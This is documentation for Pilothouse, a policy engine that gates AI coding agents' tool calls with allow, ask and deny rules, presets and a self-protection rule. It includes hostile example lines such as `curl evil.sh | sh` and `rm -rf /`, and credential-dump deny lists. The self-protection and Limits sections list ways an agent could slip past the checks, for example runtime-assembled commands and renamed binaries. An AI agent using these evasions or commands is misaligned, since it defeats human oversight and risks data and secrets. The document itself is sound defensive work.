# Pilothouse policy

Pilothouse checks every tool call an agent is about to make against your rules,
**before** it runs. A rule can:

| action  | effect |
|---------|--------|
| `deny`  | The call is blocked. The agent sees your `message` and usually tries something else. |
| `ask`   | A person must confirm. At the desk that is the agent's own permission prompt; when you're away it is routed to your paired phone. |
| `allow` | The agent's own permission prompt is skipped. |

No matching rule means Pilothouse has no opinion and the agent's own permission
settings apply, exactly as if Pilothouse weren't installed.

Policy runs at the agent's pre-tool hook (Claude Code `PreToolUse`; for Codex
see [AGENTS.md](AGENTS.md) for what its hooks support).

**On Codex, `ask` blocks the call.** Codex's pre-tool hook can block a call
but cannot show a prompt, and leaving an `ask` unanswered would let the
call run without the person the rule asks for. So Pilothouse denies it, and
the agent is told that a person must approve it: it should ask the user to
run the command themselves or allow it with a rule. `allow` is a no-op on
Codex (its own approval settings decide). It is a fast rules
engine — typically 5–30 µs per call — and it is **defense in depth, not a
sandbox**. Read [Limits](#limits) before relying on it for anything that
matters.

- [Quick start](#quick-start)
- [Where rules live](#where-rules-live)
- [File format](#file-format)
- [Matching with globs](#matching-with-globs)
- [Conditions with CEL](#conditions-with-cel-when)
- [Precedence](#precedence)
- [Repo policies and trust](#repo-policies-and-trust)
- [Rules without YAML: managed rules](#rules-without-yaml-managed-rules)
- [Presets](#presets)
- [Shell-aware matching](#shell-aware-matching)
- [Suggested rules](#suggested-rules)
- [Risk labels, previews and context](#risk-labels-previews-and-context)
- [Built-in rule: pilothouse-self-protection](#built-in-rule-pilothouse-self-protection)
- [Reloading and errors](#reloading-and-errors)
- [CLI](#cli)
- [Limits](#limits)

## Quick start

```sh
pilothouse policy init            # writes ~/.pilothouse/policy.yaml with working examples
$EDITOR ~/.pilothouse/policy.yaml
pilothouse policy check           # validates; errors come with line numbers
pilothouse policy test --command "git push --force origin main"
pilothouse policy replay --since 7d   # what would your new rules have changed?
```

The starter file blocks force-pushes, `rm -rf /`-style deletes and reads of
`.env`/key files; asks before `git push` to main/master and before
`curl … | sh`; and allows read-only tools. Every rule in it is a working
example to copy from.

## Where rules live

Rules are evaluated from these sources, in this order:

1. **Built-in** — `pilothouse-self-protection`, always on (see [below](#built-in-rule-pilothouse-self-protection)).
2. **Your file** — `~/.pilothouse/policy.yaml` (`$PILOTHOUSE_HOME/policy.yaml`).
3. **Managed rules** — `~/.pilothouse/rules.yaml`, which Pilothouse writes:
   rules added from your phone or with `pilothouse policy add`, then the
   rules of each [preset](#presets) you switched on (see
   [managed rules](#rules-without-yaml-managed-rules)).
4. **The repo's file** — `<repo root>/.pilothouse/policy.yaml`, for calls made
   inside that git repository. Allow rules here only count if you trust the
   repo (see [trust](#repo-policies-and-trust)).

All sources are combined: a call is checked against every rule from every
source, and the [strictest result wins](#precedence).

## File format

```yaml
version: 1
rules:
  - name: no-force-push                     # required, unique in the file
    description: Never force-push            # optional, for humans
    match: { kind: shell, command: "*git*push*" }   # globs, AND-ed
    when: 'has_word(command, "--force") || has_word(command, "-f")'  # optional CEL, AND-ed
    action: deny                             # allow | ask | deny
    message: Force-push is blocked. Open a PR instead.   # shown to the agent
    agents: [claude, codex]                  # optional: only these agents
```

| key | required | meaning |
|---|---|---|
| `version` | yes | Must be `1`. |
| `rules` | no | List of rules. An empty or missing list is valid. |
| `name` | yes | Unique within the file. Names starting with `pilothouse-` are reserved. |
| `description` | no | Free text. |
| `match` | one of `match`/`when` | Map of field → glob (or list of globs, meaning "any of"). All fields must match. |
| `when` | one of `match`/`when` | A [CEL](https://cel.dev) expression that must be true. |
| `action` | yes | `allow`, `ask` or `deny`. |
| `message` | no | Shown to the agent (and you) on deny/ask. A sensible default is used if empty. |
| `agents` | no | `claude`, `codex`, `generic`. The rule only applies to these agents. |

Decoding is strict: unknown keys, duplicate keys, unknown `kind`/`agent`
values, bad globs and CEL errors are all reported with their line number (and
a "did you mean" suggestion for typos). A file with any error is not used —
see [Reloading and errors](#reloading-and-errors). YAML anchors and aliases
work. Files are limited to 1 MB and 1000 rules.

## Matching with globs

`match:` fields:

| field | value matched | glob style |
|---|---|---|
| `agent` | `claude`, `codex` or `generic` | text |
| `tool` | vendor tool name: `Bash`, `Edit`, `Write`, `Read`, `WebFetch`, `mcp__github__create_pr`, Codex `shell`, `apply_patch`… | text |
| `kind` | vendor-neutral class: `shell`, `edit`, `read`, `web`, `mcp`, `other` | text |
| `command` | the **whole** shell command line, as the agent wrote it | text |
| `path` | every file the tool touches; the field matches if **any** path matches (shell commands: see below) | path |
| `cwd` | the session's working directory | path |
| `repo` | the git repository root (empty outside a repo) | path |
| `branch` | the current git branch | path |

Glob syntax:

| syntax | meaning |
|---|---|
| `*` | any run of characters. In **path** style it stops at `/`. |
| `**` | (path style) any run of characters including `/`. `a/**/b` also matches `a/b`; `a/**` also matches `a` itself. |
| `?` | exactly one character (path style: not `/`). |
| `{a,b,c}` | any of the alternatives; may nest: `{x,y{1,2}}`. A brace group with no comma (`{}` , `{x}`) is literal, as in bash. |
| `\x` | the character `x` literally (`\*`, `\{`). |

There are deliberately no `[...]` character classes, so commands such as
`[ -f x ]` can be matched literally. Matching is case-sensitive.

Path conveniences:

- Shell commands have no paths, except the files named in an
  `apply_patch <<'EOF' … *** Update File: x … EOF` heredoc inside them (how
  Codex models without an `apply_patch` tool edit files). When the heredoc is
  the whole command (optionally after `cd dir &&`), Codex applies the patch
  itself and the call counts as `kind: edit`. Otherwise it stays
  `kind: shell` with those files as its paths: **deny and ask rules see
  them, allow rules never decide on them** (an allow rule that matches on
  `path:` or mentions `path`/`paths` in `when:` is reported as ignored),
  because the rest of the command may do anything.
- Tool paths are made absolute before matching: `~` is expanded and paths
  relative to the working directory are joined to it (`../x` is resolved).
- In patterns, a leading `~/`, `$HOME/` or `${HOME}/` means your home
  directory.
- A **relative** path pattern matches at any depth: `.env` means `**/.env`,
  `*.pem` means `**/*.pem`, `src/**` means `**/src/**`. Start the pattern
  with `/` or `~/` to anchor it.

Examples:

```yaml
match: { tool: [Write, Edit, MultiEdit] }               # any of
match: { kind: shell, command: "*terraform apply*" }    # substring-ish
match: { path: ["~/.ssh/**", "*.pem", ".env.*"] }
match: { repo: "~/work/**", branch: "release/*" }
```

`command` globs see the raw line, so `git push*` does not match
`cd x && git push`; use `*git*push*` or a CEL condition when you care.

## Conditions with CEL (`when:`)

`when:` is a [CEL](https://github.com/google/cel-spec/blob/master/doc/langdef.md)
expression evaluated only if `match:` (if any) matched. It must return a bool.

Variables:

| variable | type | value |
|---|---|---|
| `agent` | string | `claude`, `codex`, `generic` |
| `tool` | string | vendor tool name |
| `kind` | string | `shell`, `edit`, `read`, `web`, `mcp`, `other` |
| `command` | string | shell command line (`""` for other tools) |
| `paths` | list(string) | absolute paths the tool touches |
| `path` | string | first of `paths`, or `""` |
| `input` | map | the raw tool input JSON object (`input.file_path`, `input.url`, …) |
| `cwd`, `repo`, `branch` | string | session context (`repo`/`branch` empty outside git) |
| `mode` | string | `observed` (hooks) or `wrapped` (`pilothouse run`) |
| `checkpoint` | string | `pre_tool` |
| `hour` | int | local hour, 0–23 |
| `weekday` | int | 0 = Sunday … 6 = Saturday |

Functions: everything in standard CEL (`startsWith`, `endsWith`, `contains`,
`matches` (RE2), `size`, `in`, `exists`, `all`, `filter`, `map`, …), the CEL
[strings extension](https://pkg.go.dev/github.com/google/cel-go/ext#Strings)
(`lowerAscii`, `split`, `replace`, `trim`, `indexOf`, …), plus:

- `glob(s, pattern)` / `s.glob(pattern)` — path-style glob (above); a leading
  `~/` is your home. Relative patterns are **not** rewritten here.
- `has_word(s, word)` / `s.has_word(word)` — `word` occurs as a whole word.
  Words are separated by whitespace and shell punctuation `; & | ( ) < > ' "
  `` ` `` `$ = , :`; `-`, `.`, `/` and `_` are part of words. So
  `has_word("git push --force-with-lease", "--force")` is false and
  `has_word("git push origin HEAD:main", "main")` is true.

Tip: inside YAML, quote the expression with single quotes and use CEL raw
strings `r"..."` for regular expressions so backslashes need no escaping, or
use a folded block (`when: >-`) for long expressions.

### Cookbook

```yaml
# Force-push in any spelling (but not --force-with-lease)
when: 'has_word(command, "--force") || has_word(command, "-f") || command.matches(r"\spush\s[^;&|]*\s\+\S")'

# Pushing to main, explicitly or from main
when: 'has_word(command, "main") || (branch == "main" && !command.matches(r"git\s+push\s+\S+\s+\S"))'

# Only outside working hours
when: 'hour < 8 || hour >= 20 || weekday == 0 || weekday == 6'

# Edits outside the repo
match: { kind: edit }
when: 'repo != "" && paths.exists(p, !p.startsWith(repo + "/"))'

# Every touched file is a test file (all() is true for an empty list, so
# require at least one path)
when: 'size(paths) > 0 && paths.all(p, glob(p, "**/*_test.go"))'

# Fetching plain-HTTP URLs
match: { kind: web }
when: 'has(input.url) && input.url.startsWith("http://")'

# Package installs
when: 'command.matches(r"\b(npm|pnpm|yarn)\s+(i|install|add)\b|\bpip3?\s+install\b|\bbrew\s+install\b")'

# Case-insensitive keyword
when: 'command.lowerAscii().contains("drop table")'

# A command line with no chaining, pipes, redirection or substitution (to
# make a hand-written allow rule as strict as a managed one is)
when: '!command.matches(r"[;&|`$<>()\n\\]")'
```

The same ideas without YAML, as [managed rules](#rules-without-yaml-managed-rules):

```sh
# Tests and the linter run without prompts in this repo (shell-aware: chains
# with anything else still ask)
pilothouse policy add fast-checks --action allow --here \
  --command "npm test" --command "npm test *" --command "npm run lint" --command "npm run lint *"

# Every push and every terraform apply needs a person
pilothouse policy add ask-push --action ask --command "git push" --command "git push *"
pilothouse policy add ask-tf --action ask --command "terraform apply" --command "terraform apply *"

# Never let an agent touch production databases
pilothouse policy add no-prod-db --action deny --command "psql *prod*" --message "Use the staging database."

# Edits anywhere under one project's src/ are fine
pilothouse policy add edit-src --action allow --kind edit --path "~/src/api-server/src/**"

# Trust one MCP tool
pilothouse policy add gh-read --action allow --tool mcp__github__get_issue
```

`input` keys depend on the agent and tool; use `has(input.x)` before reading
an optional key. A `when:` that fails at run time (missing key, wrong type)
counts as **not matching** and is listed as ignored in `pilothouse policy test`
— so don't write deny rules that depend on a key being present without
`has()`. Each evaluation has a CEL cost limit so a pathological expression
can't stall the hook.

## Precedence

1. If any matching rule says **deny**, the call is denied.
2. Otherwise, if any says **ask**, a person is asked.
3. Otherwise, if any says **allow**, it is allowed.
4. Otherwise Pilothouse has no opinion.

The *deciding rule* is the first rule with the winning action, in order
built-in → your file → repo file, top to bottom; its `message` is used. Every
matching rule is reported (`pilothouse policy test`, the `policy.decision`
event), including ones that were ignored and why.

Session grants ("allow for this session" answers) are applied by the daemon
after deny and ask rules, so they can never override a deny or an ask.

Tools that ask the person something — Claude Code's `AskUserQuestion` and
`ExitPlanMode`, Codex's `request_user_input` — are decided by **deny** rules
only. An allow rule or a grant would not answer the question (or would
approve a plan nobody read), and an ask rule adds nothing because the
question reaches the person anyway. A deny rule (for example, "no questions
in unattended runs") still blocks them. See [AGENTS.md](AGENTS.md#questions-and-plans).

## Repo policies and trust

A repository can ship rules in `<repo>/.pilothouse/policy.yaml`, discovered
automatically when an agent works in that repo.

Because an agent can write to the repo it works in — and anyone can publish a
repo — **repo files are untrusted by default**: their `deny` and `ask` rules
apply, but their `allow` rules are ignored (and shown as such). Once you have
read a repo's policy and want its allow rules too:

```sh
pilothouse policy trust          # the current git repo
pilothouse policy trust ~/src/app
pilothouse policy untrust        # back to deny/ask only
```

Trust is stored in `~/.pilothouse/trusted-repos.yaml` (symlinks resolved). The
self-protection rule makes a person confirm any agent edit to that file, to
your user policy, and to the repo's own `.pilothouse/` directory.

## Rules without YAML: managed rules

You don't have to write YAML to make a rule. From an approval card on your
phone (one tap on a [suggestion](#suggested-rules)), from the Rules page, or
from the terminal:

```sh
pilothouse policy add ask-push --action ask --command "git push" --command "git push *"
pilothouse policy add allow-tests --action allow --command "npm test" --command "npm test *" --here
pilothouse policy add no-prod-db --action deny --command "psql *prod*" --message "Use the staging database."
pilothouse policy disable allow-tests      # keep it, but off
pilothouse policy enable allow-tests
pilothouse policy remove allow-tests
pilothouse policy rules                    # every rule, in the order it is checked
```

These rules live in **`~/.pilothouse/rules.yaml`**, which Pilothouse writes
(your `policy.yaml` is never touched). It records who added each rule and when,
and whether it is on:

```yaml
version: 1
presets:
  - name: protect-main
    by: device:d_k3x9
    at: 2026-10-24T09:12:00Z
rules:
  - name: allow-npm-test-in-api-server
    description: Added from an approval card
    match:
      command: [npm test, npm test *]
      kind: [shell]
      repo: [/Users/ann/src/api-server]
    action: allow
    created: 2026-10-24T09:10:31Z
    by: device:d_k3x9
  - name: ask-push
    match:
      command: [git push, git push *]
    action: ask
    enabled: false
    created: 2026-10-23T17:02:11Z
    by: cli
```

- **Same rules, same checks.** Managed rules use the `match:`/`when:` format
  above and are compiled by the same compiler before anything is written; a
  change that doesn't compile is refused with the reason, and the file is
  left as it was. Writes are atomic and locked, so the daemon and a CLI
  editing at the same moment can't lose each other's change.
- **Evaluated after `policy.yaml`**, with source `managed` (and `preset` for
  presets). They never weaken the [built-in rule](#built-in-rule-pilothouse-self-protection):
  it is evaluated first and ask beats allow.
- **Commands are matched [shell-aware](#shell-aware-matching)**, unlike rules
  you write yourself.
- **From a device**, adding, enabling, disabling and removing a rule and
  switching a preset are signed actions (like approvals). A device can't add
  `when:` expressions (a CEL expression is not something to review on a
  phone; write those in `policy.yaml`), can't change built-in, hand-written,
  preset or repo rules, and can't add allow rules that would approve almost
  everything: an allow rule must name a command, a tool or a path, its
  command and tool patterns must start with a literal word (not `*`), and its
  path patterns must be anchored (`/…` or `~/…`) below a directory narrower
  than your home. Names are letters, digits, `.`, `_` and `-`; names in use by
  any other rule, and names starting with `pilothouse-`, are refused.
- **From the terminal** (the CLI, the TUI), the same checks apply, except that
  `when:` is allowed. The CLI goes through the daemon when it runs (which
  records a `policy.changed` event and applies the change at once) and edits
  the file directly otherwise.
- **Editing by hand** works too; Pilothouse keeps your changes but rewrites the
  file's layout the next time it changes it. A broken file keeps its last
  good rules in force, like `policy.yaml`.

Every change emits a `policy.changed` event (`{op, name, by, at}`; op is
`add`, `remove`, `enable`, `disable`, `preset_on` or `preset_off`).

## Presets

A preset is a named bundle of rules you switch on and off as a whole:

```sh
pilothouse policy preset                         # list them
pilothouse policy preset guarded-autopilot       # what it does, rule by rule
pilothouse policy preset guarded-autopilot on
pilothouse policy preset guarded-autopilot off
```

Their rules are listed by `pilothouse policy rules` as
`<preset>/<rule>` with source `preset`, and decide like any other rule.

| preset | what it does |
|---|---|
| `guarded-autopilot` | A safe alternative to `--dangerously-skip-permissions`. **Allows** routine work in a repo without prompts: reading, editing files inside the session's repo, tests, builds, linters, installs from lockfiles, read-only git and shell commands. **Denies** destructive commands: recursive deletes of `/`, `~`, `.`, `*` and the like, `git reset --hard`, `git clean -f`, discarding all changes, force-pushes, history rewrites, `DROP`/`TRUNCATE` through a database client, disk formatting, `chmod -R 777`, database resets. **Asks** before every push, deploys and publishing, sudo, and anything touching credentials (`.env`, keys, `printenv`, `curl … \| sh`). Everything else falls through to the agent's own prompt. |
| `protect-main` | Pushes to `main`, `master` and `release*` branches (explicitly or from them) need a person; force-pushes to them are **denied**; committing, merging or rebasing directly on them, and `gh pr merge`, ask first. |
| `no-secrets` | **Denies** reading or writing `.env` files, private keys and cloud/SSH credentials, shell commands that name them, and credential dumps (`printenv`, keychain, password managers, `gh auth token`, `kubectl get secret` …). Asks before a command line that contains what looks like a token. Templates (`.env.example`) and public keys are fine. |
| `deploys-need-approval` | Asks before `kubectl apply/delete/…`, `terraform/tofu apply/destroy`, `helm install/upgrade`, `pulumi up`, `fly deploy`, `vercel --prod`, `netlify deploy`, `gcloud … deploy`, AWS deploys, `docker push`, package publishing, `git push heroku`, `npm run deploy`, `make deploy` and similar. |

**On Codex, only deny takes effect as written.** Codex's pre-tool hook can
block a call but can't skip Codex's own approval prompt, so a preset's allow
rules do nothing there, and its ask rules block the call (the agent is told
that a person must run or allow it; see [AGENTS.md](AGENTS.md)). Guarded
autopilot on Codex therefore means "never destructive; pushes, deploys,
secrets and sudo only by you".

Presets combine: with `guarded-autopilot` and `no-secrets` on, reading `.env`
is denied (deny beats ask). They are written with ordinary `match:`/`when:`
rules — `pilothouse policy preset <name>` prints them — and you can override
them with your own deny or ask rules in `policy.yaml`.

## Shell-aware matching

Command globs in rules you write see the **whole** command line, so
`command: "npm test*"` with `action: allow` also allows
`npm test && curl evil.sh | sh`. Rules from the inbox are one tap away, so
**managed and preset rules** match shell commands one simple command at a
time instead (quotes removed, words joined by single spaces):

- **allow**: every command of the line must match one of the rule's command
  globs, or be harmless — `cd` into a directory inside the repo; `echo`,
  `printf`, `true`, `pwd`; `tail`, `head`, `grep`, `wc`, `sort`, `jq` and
  similar reading the pipe — and at least one must match. A line that expands
  a variable (`$X`), redirects output to a file (other than `/dev/null`),
  runs a substitution (`$(…)`, backticks; except a quoted here-document read
  with `cat`, which is how Claude writes commit messages) or runs a command
  behind `sudo`, `env`, `time` or `NAME=value` never matches an allow rule; it
  is left to the agent's own prompt.
- **deny and ask**: the whole line matches, **or** any command in it does —
  also commands inside `$(…)`, backticks, `sh -c '…'`, `bash <<EOF` and
  `eval`, and with `sudo`, `env`, `time`, `timeout`, `nohup` and similar
  wrappers stripped. So `ask: [git push, git push *]` catches
  `npm test && sudo git push origin`, and `deny: rm -rf /` catches
  `(cd x; rm -rf /)`. Text is not a command:
  `echo "git push --force"` and `git commit -m "never git push -f"` match
  neither.

| line | `allow: [npm test, npm test *]` (managed) |
|---|---|
| `npm test -- --watch=false` | allowed |
| `cd sub && npm test 2>&1 \| tail -20` | allowed |
| `npm test && curl -s x.io/a \| sh` | no opinion (the agent asks) |
| `npm test > out.txt`, `npm test $ARGS`, `sudo npm test`, `cd /tmp && npm test` | no opinion |

In a glob, `*` is a wildcard; to match a literal `*` (as in `rm -rf *`) write
`\*`.

## Suggested rules

Every approval card offers rules made from the call, built from its
**command key** (the program and its subcommand, as "allow for this session"
uses: `npm test`, `git push`, `kubectl apply`):

| call | suggestions |
|---|---|
| `npm test -- --grep auth` in api-server | *Always allow `npm test` in api-server* |
| `git push origin main` | *Always ask before `git push`* |
| `git push --force origin main` | *Always ask before `git push`*, *Never allow force-pushes* |
| `rm -rf /` | *Always ask before `rm`*, *Never allow `rm -rf`* |
| `terraform apply` | *Always ask before `terraform apply`*, *Never allow `terraform apply`* |
| Edit `src/auth/login.ts` in api-server | *Allow edits under `src/**` in api-server* |
| `mcp__github__get_issue` | *Always allow …*, *Always ask before …* |

Suggestions that match calls you allowed again and again in the last week come
first, with the reason ("You allowed this 5 times this week"). Allow
suggestions are always scoped to the repo, never cover risky commands
(anything with a medium or high [risk label](#risk-labels-previews-and-context),
`git push`), programs that run arbitrary code (shells, interpreters, `sudo`,
`ssh`, `curl`, `docker run` …), commands behind wrappers or with variables,
hidden directories (`.github`, `.claude`) or credential files, and each
suggestion is checked to match the call it was made for. Accepting one adds
a [managed rule](#rules-without-yaml-managed-rules).

## Risk labels, previews and context

Approval cards (phone, TUI) also show, without any rule:

- **Risk labels**, most severe first, at most one per kind: `destructive`
  (recursive deletes of broad paths, `git reset --hard`, `git clean -f`,
  `DROP`/`TRUNCATE`, `mkfs`, `dd of=/dev/…`, `chmod -R 777`, `find -delete` …),
  `force_push` (including `+refspec` and `--mirror`), `protected_branch`
  (pushes or commits to main/master/release), `deploy`, `secrets` (`.env`,
  `~/.ssh`, `~/.aws`, keys, tokens in arguments, credential dumps), `network`
  (`curl | sh`, uploads, downloads), `install` (dependencies, new packages,
  global installs), `sudo`, `outside_repo` (writes outside the session's
  repo, except temp directories). They read the command like the
  self-protection rule does — chains, pipes, substitutions, here-documents,
  `sudo`/`env`/`time` wrappers, quoting — so `git commit -m "rm -rf /"` is not
  destructive. Labels never repeat a credential.
- **A diff** for Claude's Edit, MultiEdit, Write and NotebookEdit, Codex's
  `apply_patch` (the tool or the `apply_patch <<EOF` shell form) and
  OpenCode's edit/write: a unified diff with real line numbers when the file
  can be read (up to 256 KB), created vs overwritten, up to 20 KB of diff per
  file and 20 files. Credential files, Pilothouse's home and agent settings
  files are never read for context: their diff comes from the tool input
  alone.
- **The agent's last words** before it asked, from the end of its transcript
  (only under `~/.claude/projects` or `$CODEX_HOME/sessions`), with anything
  that looks like a credential redacted.

## Built-in rule: `pilothouse-self-protection`

Agents must not be able to approve their own requests or loosen your rules.
The daemon enforces that at the socket (an `approve` from inside an agent's
process tree is rejected). On top of that, this built-in rule makes a person
confirm (`ask`) any tool call that:

- **runs a pilothouse admin command**: `approve`, `deny`, `policy`
  (except the read-only `policy check|test|status|replay|rules`), `pair`,
  `devices`, `remote`, `service`, `hooks`, `here`, `away`, `auto`, `stop`,
  `open`, `setup`; or
- **writes to a protected path**: the Pilothouse home (`~/.pilothouse/**`, including
  the config, database, keys, policy and trust list), the socket directory, each
  agent's user settings files (`~/.claude/settings.json`,
  `~/.codex/config.toml`, …), project-level agent settings in **any**
  directory (`**/.claude/settings.json`, `**/.claude/settings.local.json`,
  `**/.codex/config.toml`, `**/.codex/hooks.json` — so a sibling repo's
  settings are covered too), and the current repo's `.pilothouse/**`.

  Protected entries are either literal paths (the path and everything under
  it) or path-style globs, matched like `path:` globs in a rule (the match
  and everything under it).

  Task worktrees (`pilothouse task new`) are **not** protected: they live in
  `~/.pilothouse-worktrees/<repo>/<slug>` (or `$PILOTHOUSE_WORKTREES`),
  outside the Pilothouse home, so a task's agent works without a prompt per
  call. Worktrees of tasks made before that change, in
  `~/.pilothouse/worktrees/`, are carved out of the protected home too; the
  agent settings and `.pilothouse/` inside any worktree stay protected.

  The reason names the path and what it holds, e.g. "this runs `git status`
  in ~/.pilothouse/keys, inside ~/.pilothouse (Pilothouse's own settings,
  keys and database)".

It cannot be turned off, and because ask outranks allow, no allow rule or
session grant silences it. A deny rule can still make it stricter.

How commands are recognised. Pilothouse reads the command line like a shell
would — quotes, escapes, `$'…'` strings, `;`, `&&`, `||`, `|`, subshells,
`{ …; }`, `$(…)`, backticks, `<(…)`, redirections — and then finds what each
simple command actually runs. It sees through:

- paths and spelling: `./pilothouse`, `/usr/local/bin/pilothouse`, `"pilothouse"`,
  `ask''gate`, `a\skgate`, `$'\x61skgate'`, `PILOTHOUSE` (case-insensitive file systems);
- wrappers: `env [-i] [-u X] X=1`, `env -S "…"`, leading `X=1`, `sudo`,
  `doas`, `nohup`, `time`, `command`, `exec`, `nice`, `timeout`, `xargs`,
  `stdbuf`, `caffeinate`, `busybox`, `if/then/do …`;
- nested shells: `sh|bash|zsh|… -c "…"`, here-strings `bash <<< "…"`,
  `eval "…"`, `find -exec …`, `pilothouse run -- …`;
- writes: redirections (`>`, `>>`, `>|`, `&>`, `2>`, `>&`), and any command
  that is not a known read-only tool (`cat`, `less`, `grep`, `ls`, `sed`
  without `-i`, `sort` without `-o`, `find` without `-delete/-exec`, …)
  given a protected path — including `cp`, `mv`, `rm`, `tee`, `ln`,
  `chmod`, `dd of=`, `sqlite3`, editors, and `curl --unix-socket` to the
  Pilothouse socket. `cd` earlier in the line is followed, and `~`, `$HOME` and
  `$PILOTHOUSE_HOME` are expanded.

For edit tools the target paths are resolved through symlinks.

**Decision: text is not a command.** `echo pilothouse approve r_1`,
`git commit -m "pilothouse approve: fix"` and `grep "pilothouse approve" docs/` do
**not** trigger the rule: the words are arguments, not an invocation, and
flagging them would make working on anything that mentions Pilothouse
miserable. The exception is a line that feeds text to an interpreter —
`… | sh`, `bash -s`, `python -c`, `node -e`, `osascript -e`, `awk`,
`source`, a computed command such as `$CMD approve` — where Pilothouse cannot
follow the code and instead scans the whole line, quoted or not, for an
admin invocation or a protected path.

What it does not catch (and why the socket check exists): commands assembled
at run time (`a=ask; ${a}gate approve`, `printf` tricks), a copied or renamed
binary, scripts in files (`bash ./x.sh`), interpreter code that builds paths
dynamically, other users' homes, and anything outside the tool call itself.

## Reloading and errors

- Files are compiled once and re-checked on disk (a `stat`) at most every
  two seconds per file; a changed file is recompiled. Edits take effect
  within about two seconds with no restart. Repo files are discovered the
  first time an agent works in that repo.
- **A file with any error is not used as written.** If an earlier version of
  that file compiled, its rules stay in force until you fix the error — a
  typo never silently drops your deny rules. If it never compiled, none of
  its rules apply. Either way the error (with line numbers) is shown by
  `pilothouse policy status` and `pilothouse policy check`.
- **An empty (0-byte) file is an error too**, not "no rules": editors that
  save in place truncate the file before writing it, and reading it in that
  moment must not drop your deny rules. The previous rules stay in force.
  To clear a file's rules on purpose, write `version: 1` and `rules: []`, or
  delete the file.
- A file that changes while it is being read (size or modification time
  moves, or fewer bytes arrive than expected) is treated as mid-write: the
  previous rules stay and it is read again on the next tool call.
- Deleting a file removes its rules.
- The built-in rule works even if every file is broken.

## CLI

```
pilothouse policy init [--force]          starter ~/.pilothouse/policy.yaml (--force keeps a .bak-<time> copy)
pilothouse policy check [file]            validate (default: your file + this repo's); exit 1 on errors
pilothouse policy test ["command"] [flags] what would happen to one call
    --command "…"  --path p (repeatable)  --tool Bash  --kind shell|edit|read|web|mcp|other
    --agent claude|codex|generic  --cwd dir  --repo dir  --branch b  --mode observed|wrapped
    --input '{json}'  --json
pilothouse policy replay [--since 7d] [--all] [--json]
                                        re-run logged pre_tool calls with today's files; show changes
pilothouse policy trust [repo]            allow rules in that repo's policy apply (default: current repo)
pilothouse policy untrust [repo]
pilothouse policy status [--json]         loaded files, rule counts, errors, trusted repos
pilothouse policy rules [--json]          every rule in evaluation order (source, action, match) and the presets
pilothouse policy preset [name [on|off]]  list presets, show one, or switch it on/off
pilothouse policy add <name> --action allow|ask|deny [match flags] [--message m] [--description d] [--when expr]
    match flags (repeatable globs, all must match): --command --path --tool --kind --repo --branch --cwd --agent
    --here                                only in the current git repo
pilothouse policy enable|disable|remove <name>   managed rules only
```

`policy test` infers what it can: a command (as the argument or `--command`)
alone means a `Bash` (Claude) or `shell` (Codex) call; `--tool Edit` implies
`kind: edit`; `--repo` and `--branch` default to the current git repo. It
evaluates your files, the managed rules and enabled presets. `policy replay`
needs the daemon (it reads the event log through it) and evaluates each call
at its original time, with the session's repo and branch as they are now.
`status` and `rules` ask the daemon, or read the files directly if it isn't
running; `add`, `enable`, `disable`, `remove` and `preset … on|off` go through
the daemon, or edit `~/.pilothouse/rules.yaml` directly (same checks, same
lock) when it isn't running. An agent running these is stopped by the
[self-protection rule](#built-in-rule-pilothouse-self-protection), except the
read-only `check`, `test`, `status`, `replay` and `rules`.

Colours are used only on a terminal and never with `NO_COLOR`.

## Limits

Be clear about what this is:

- **It sees what the hook sees.** Policy runs in the agent's pre-tool hook.
  Tools that don't go through the hook, agents without hook support, and
  work done inside a tool (a script the agent runs, a build step, an MCP
  server) are invisible to it.
- **It is pattern matching, not a sandbox.** Shell is too expressive to
  analyse completely; a determined or adversarial agent can phrase a
  command your globs don't anticipate. Prefer deny rules for the things you
  never want, keep `ask` for things a person should see, and use OS-level
  isolation (containers, separate users, the agent's own sandbox) where the
  stakes are high.
- **It fails open by default.** If the daemon is down or slow, the hook
  answers "no opinion" within 2 s so your agents keep working
  (`approvals.fail_closed: true` in `config.yaml` makes pre-tool calls deny
  instead).
- **Context can be stale.** `branch` and `repo` come from git at the time of
  the call (cached for up to 30 s by the daemon); `path` is what the agent
  declared, not what the tool ends up touching.
- **Speed.** Evaluation is typically 5–30 µs for 50 rules (built-ins
  included); the budget is p99 < 5 ms. Regular expressions are RE2 (linear
  time) and each `when:` has a CEL cost limit.
